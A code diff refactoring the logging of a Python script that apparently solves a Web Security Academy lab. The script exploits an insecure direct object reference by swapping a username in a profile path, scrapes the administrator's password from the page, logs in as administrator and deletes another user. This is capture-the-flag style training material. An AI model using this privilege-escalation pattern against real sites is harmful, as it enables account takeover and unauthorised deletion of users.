@@ -1,5 +1,5 @@
+from web_security_academy.core.logger import logger
 from bs4 import BeautifulSoup
-from ..utils import *
 
 
 def solve_lab(session, *args):
@@ -7,37 +7,40 @@ def solve_lab(session, *args):
     csrf = session.get_csrf_token("/login")
     data = {"csrf": csrf, "username": "wiener", "password": "peter"}
 
-    print_info(
+    logger.info(
         f"Getting user profile path by extracting the redirect link from logging in..."
     )
     resp = session.post_path("/login", data=data, allow_redirects=False)
 
     if resp.status_code != 302:
-        print_fail("Invalid credentials.")
+        logger.failure("Invalid credentials.")
+        return
     else:
         location = resp.headers["Location"]
-        print_success(f"Login successful. Location: {location}\n")
+        logger.success(f"Login successful. Location: {location}")
 
     # Extract administrator password
     location = location.replace("wiener", "administrator")
-    print_info(f'Visiting "{session.url}{location}"...')
+    logger.info(f'Visiting "{session.url}{location}"...')
     resp = session.get_path(location)
 
     if resp.status_code != 200:
-        print_fail("Unable to visit URL.")
+        logger.failure("Unable to visit URL.")
+        return
 
     soup = BeautifulSoup(resp.text, "lxml")
     password = soup.select_one('input[name="password"]').get("value")
 
     if password is None:
-        print_fail("Unable to extract administrator password.")
+        logger.failure("Unable to extract administrator password.")
+        return
     else:
-        print_success(f"Administrator password: {password}\n")
+        logger.success(f"Administrator password: {password}")
 
     # Delete user carlos
     session.login("administrator", password)
 
-    print_info(
+    logger.info(
         f'Extracting path to delete user carlos by visiting "{session.url}admin"...'
     )
     resp = session.get_path("/admin")
@@ -46,10 +49,11 @@ def solve_lab(session, *args):
     tag = soup.find(lambda tag: tag.has_attr("href") and "carlos" in tag.get("href"))
 
     if tag is None:
-        print_fail("Unable to find path.")
+        logger.failure("Unable to find path.")
+        return
     else:
         delete = tag.get("href")
-        print_success(f"Found path: {delete}\n")
+        logger.success(f"Found path: {delete}")
 
-    print_info("Deleting user carlos...")
+    logger.info("Deleting user carlos...")
     session.get_path(delete)
